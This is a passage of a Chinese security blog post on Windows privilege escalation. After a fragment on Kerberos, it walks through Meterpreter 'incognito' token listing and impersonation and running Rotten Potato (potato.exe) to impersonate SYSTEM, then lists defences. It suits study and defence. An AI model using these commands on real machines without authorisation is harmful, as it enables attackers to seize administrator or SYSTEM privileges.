+<p>2.认证服务器受到请求后，将包含客户端密钥的加密证书发送到客户端。该证书包含服务器Ticket（包含由服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（会话密钥，Session Key）。当然，认证服务器也会向服务器发送一份该证书，使服务器能够验证登陆服务器的客户端的身份。</p>
+<p>3.客户端将Ticket发送给服务器，如果服务器确认该客户端的身份，就允许它登陆服务器。</p>
+<h2 id="1-令牌窃取"><a href="#1-令牌窃取" class="headerlink" title="1.令牌窃取"></a>1.令牌窃取</h2><p>MSF有着这一方面相关的利用方法：</p>
+<p>​    假设已经获取到了目标机器的meterpreter shell。</p>
+<p>首先输入<code>use incognito</code>命令，然后输入<code>list_tokens -u </code>命令，即可列出可能的令牌。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/22.png" srcset="/img/loading.gif"></p>
+<p>这里有两种类型的令牌：一种是<code>Delegation Tokens</code>（授权令牌），它支持交互式登录（例如，可以通过远程桌面登录及访问）;另一种是<code>Impersonation Tokens</code>（模拟令牌），它支持交互式的会话。</p>
+<p>​    令牌的数量取决于<code>meterpreter shell</code>的访问级别。假设已经获得了一个系统管理员的授权令牌，如果攻击者可以伪造这个令牌，便可以拥有它的权限。</p>
+<p>从上面那张图输出的信息，我们可以知道有一个有效的授权令牌<code>reader-l-PC\reader-l</code>。</p>
+<p>如果我们需要获取该系统管理员的权限，操作方法如下：</p>
+<p>在<code>incognito</code>中调用<code>impersonate_token</code>，假冒<code>reader-l</code>用户进行操作。</p>
+<p>例如：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">impersonate_token</span> reader-l-<span class="hljs-built_in">PC</span>\\reader-l<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/23.png" srcset="/img/loading.gif"></p>
+<p>需要注意的是：在输入主机名\用户名时，需要输入两个反斜杠<code>\\</code>如上图。</p>
+<h2 id="2-Rotten-Potato本地提权分析"><a href="#2-Rotten-Potato本地提权分析" class="headerlink" title="2.Rotten Potato本地提权分析"></a>2.Rotten Potato本地提权分析</h2><p>​    如果目标系统中存在有效的令牌，可以通过<code>Rotten Potato</code>程序快速模拟用户令牌来实现权限的提升。</p>
+<p>​    先将potato.exe文件上传到目标机器上。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">upload <span class="hljs-regexp">/home/u</span>buntu/potato.exe<br></code></pre></td></tr></table></figure>
+<p>​    然后执行该文件：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">execute</span> -CH -<span class="hljs-keyword">f</span> potato.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+<p>​    然后窃取模拟令牌来提高权限</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">impersonate_token <span class="hljs-string">&quot;NT AUTHORITY<span class="hljs-subst">\\</span>SYSTEM&quot;</span><br></code></pre></td></tr></table></figure>
+<h2 id="3-针对令牌窃取提权的防御措施"><a href="#3-针对令牌窃取提权的防御措施" class="headerlink" title="3.针对令牌窃取提权的防御措施"></a>3.针对令牌窃取提权的防御措施</h2><p>1.及时安装微软推送的补丁。</p>
+<p>2.对来路不明的或者有危险的软件，既不要在系统中使用，也不要在虚拟机中使用。</p>
+<p>3.对令牌的时效性进行限制，以防止散列值被迫接后泄露有效的令牌信息。</p>
+<p>4.对于令牌，应采取加密存储及多重验证保护。</p>
+<p>5.使用加密链路SSL/TLS传输令牌，以防止被中间人窃听。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/03/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%BA%90%E7%A0%81%E4%B8%AD%E8%8B%A5%E5%B9%B2%E4%B8%AA%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">代码审计-某大学源码中若干个高危漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/">
+                        <span class="hidden-mobile">某大学的附属医院存储XSS漏洞-Bypass</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
